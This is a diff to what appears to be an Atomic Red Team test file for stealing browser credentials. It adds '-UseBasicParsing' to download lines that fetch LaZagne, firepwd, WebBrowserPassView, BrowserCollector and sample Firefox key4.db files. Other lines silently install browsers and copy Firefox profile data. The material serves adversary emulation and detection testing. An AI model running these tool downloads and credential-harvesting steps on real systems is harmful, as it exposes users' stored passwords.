@@ -25,7 +25,7 @@ atomic_tests:
     get_prereq_command: |
       New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction ignore -Force | Out-Null
       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-      Invoke-WebRequest "https://github.com/mitre-attack/attack-arsenal/raw/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/Modified-SysInternalsSuite.zip" -OutFile "#{file_path}\Modified-SysInternalsSuite.zip"
+      Invoke-WebRequest "https://github.com/mitre-attack/attack-arsenal/raw/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/Modified-SysInternalsSuite.zip" -OutFile "#{file_path}\Modified-SysInternalsSuite.zip" -UseBasicParsing
       Expand-Archive "#{file_path}\Modified-SysInternalsSuite.zip" "#{file_path}\sysinternals" -Force
       Remove-Item "#{file_path}\Modified-SysInternalsSuite.zip" -Force
   executor:
@@ -72,7 +72,7 @@ atomic_tests:
       if (Test-Path "#{lazagne_path}") {exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory (split-path "#{lazagne_path}") -ErrorAction ignore | Out-Null
-      Invoke-WebRequest "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe" -OutFile "#{lazagne_path}"
+      Invoke-WebRequest "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe" -OutFile "#{lazagne_path}" -UseBasicParsing
   executor:
     name: command_prompt
     elevation_required: true
@@ -92,7 +92,7 @@ atomic_tests:
     get_prereq_command: |
       New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
       $installer = "PathToAtomicsFolder\..\ExternalPayloads\ChromeStandaloneSetup64.msi"
-      Invoke-WebRequest -OutFile "PathToAtomicsFolder\..\ExternalPayloads\ChromeStandaloneSetup64.msi" https://dl.google.com/chrome/install/googlechromestandaloneenterprise64.msi
+      Invoke-WebRequest -OutFile "PathToAtomicsFolder\..\ExternalPayloads\ChromeStandaloneSetup64.msi" https://dl.google.com/chrome/install/googlechromestandaloneenterprise64.msi -UseBasicParsing
       msiexec /i $installer /qn
       Start-Process -FilePath "chrome.exe"
       Stop-Process -Name "chrome"
@@ -118,7 +118,7 @@ atomic_tests:
     get_prereq_command: |
       New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
       $installer = "PathToAtomicsFolder\..\ExternalPayloads\OperaStandaloneInstaller.exe"
-      Invoke-WebRequest -OutFile "PathToAtomicsFolder\..\ExternalPayloads\OperaStandaloneInstaller.exe" https://get.geo.opera.com/pub/opera/desktop/82.0.4227.43/win/Opera_82.0.4227.43_Setup.exe
+      Invoke-WebRequest -OutFile "PathToAtomicsFolder\..\ExternalPayloads\OperaStandaloneInstaller.exe" https://get.geo.opera.com/pub/opera/desktop/82.0.4227.43/win/Opera_82.0.4227.43_Setup.exe -UseBasicParsing
       Start-Process $installer -ArgumentList '/install /silent /launchopera=1 /setdefaultbrowser=0'
       Start-Sleep -s 180
       Stop-Process -Name "opera"
@@ -232,7 +232,7 @@ atomic_tests:
       if (get-childitem -path "$env:appdata\Mozilla\Firefox\Profiles\*.default-release\" -erroraction silentlycontinue) {exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
-      Invoke-WebRequest "https://ftp.mozilla.org/pub/firefox/releases/98.0/win64/en-US/Firefox%20Setup%2098.0.msi" -outfile "PathToAtomicsFolder\..\ExternalPayloads\firefox.msi"
+      Invoke-WebRequest "https://ftp.mozilla.org/pub/firefox/releases/98.0/win64/en-US/Firefox%20Setup%2098.0.msi" -outfile "PathToAtomicsFolder\..\ExternalPayloads\firefox.msi" -UseBasicParsing
       msiexec.exe /i "PathToAtomicsFolder\..\ExternalPayloads\firefox.msi" /quiet
       sleep -s 30
       start-process "$env:programfiles\Mozilla Firefox\firefox.exe".
@@ -266,7 +266,7 @@ atomic_tests:
       if (Test-Path "#{Firepwd_Path}") {exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction ignore -Force | Out-Null
-      Invoke-WebRequest "https://raw.githubusercontent.com/lclevy/firepwd/167eabf3b88d5a7ba8b8bc427283f827b6885982/firepwd.py" -outfile "#{Firepwd_Path}"
+      Invoke-WebRequest "https://raw.githubusercontent.com/lclevy/firepwd/167eabf3b88d5a7ba8b8bc427283f827b6885982/firepwd.py" -outfile "#{Firepwd_Path}" -UseBasicParsing
   - description: |
       Pycryptodome library must be installed 
     prereq_command: |
@@ -408,7 +408,7 @@ atomic_tests:
       if (Test-Path "#{webbrowserpassview_path}") {exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory "PathToAtomicsFolder\T1555.003\bin\" -ErrorAction ignore -Force | Out-Null
-      Invoke-WebRequest https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1555.003/bin/WebBrowserPassView.exe -OutFile "#{webbrowserpassview_path}"
+      Invoke-WebRequest https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1555.003/bin/WebBrowserPassView.exe -OutFile "#{webbrowserpassview_path}" -UseBasicParsing
   executor:
     command: |
       Start-Process "#{webbrowserpassview_path}"
@@ -432,7 +432,7 @@ atomic_tests:
     get_prereq_command: |
       New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
       $installer = "PathToAtomicsFolder\..\ExternalPayloads\FirefoxStubInstaller.exe"
-      Invoke-WebRequest -OutFile $installer "https://download.mozilla.org/?product=firefox-stub&os=win&lang=en-US"
+      Invoke-WebRequest -OutFile $installer "https://download.mozilla.org/?product=firefox-stub&os=win&lang=en-US" -UseBasicParsing
       Start-Process -FilePath $installer -Wait
       Stop-Process -Name "firefox"
   - description: |
@@ -441,14 +441,14 @@ atomic_tests:
       if (Test-Path "PathToAtomicsFolder\T1555.003\bin\BrowserCollector.exe") {exit 0} else {exit 1}
     get_prereq_command: |-
       New-Item -Type Directory "PathToAtomicsFolder\T1555.003\bin\" -ErrorAction Ignore -Force | Out-Null
-      Invoke-WebRequest "https://github.com/SaulBerrenson/BrowserStealer/releases/download/1.0.0.4/BrowserCollector_x64.exe" -Outfile: "PathToAtomicsFolder\T1555.003\bin\BrowserCollector.exe"
+      Invoke-WebRequest "https://github.com/SaulBerrenson/BrowserStealer/releases/download/1.0.0.4/BrowserCollector_x64.exe" -Outfile: "PathToAtomicsFolder\T1555.003\bin\BrowserCollector.exe" -UseBasicParsing
   - description: |
       Login Data file that is a copy of a Firefox Login Data that contains credentials for the tool to "steal." Must exist at the specified path.
     prereq_command: |-
       if (Test-Path "PathToAtomicsFolder\T1555.003\src\key4.db") {exit 0} else {exit 1}
     get_prereq_command: |-
-      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.003/src/key4.db?raw=true" -Outfile: "PathToAtomicsFolder\T1555.003\src\key4.db"
-      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.003/src/logins.json?raw=true" -Outfile: "PathToAtomicsFolder\T1555.003\src\logins.json" 
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.003/src/key4.db?raw=true" -Outfile: "PathToAtomicsFolder\T1555.003\src\key4.db" -UseBasicParsing
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.003/src/logins.json?raw=true" -Outfile: "PathToAtomicsFolder\T1555.003\src\logins.json" -UseBasicParsing 
   executor:
     command: |
       $profile = (Gci -filter "*default-release*" -path $env:Appdata\Mozilla\Firefox\Profiles\).FullName
@@ -488,7 +488,7 @@ atomic_tests:
     get_prereq_command: |
       New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
       $installer = "PathToAtomicsFolder\..\ExternalPayloads\ChromeStandaloneSetup64.msi"
-      Invoke-WebRequest -OutFile "PathToAtomicsFolder\..\ExternalPayloads\ChromeStandaloneSetup64.msi" https://dl.google.com/chrome/install/googlechromestandaloneenterprise64.msi
+      Invoke-WebRequest -OutFile "PathToAtomicsFolder\..\ExternalPayloads\ChromeStandaloneSetup64.msi" https://dl.google.com/chrome/install/googlechromestandaloneenterprise64.msi -UseBasicParsing
       msiexec /i $installer /qn
       Start-Process -FilePath "chrome.exe"
       Stop-Process -Name "chrome"
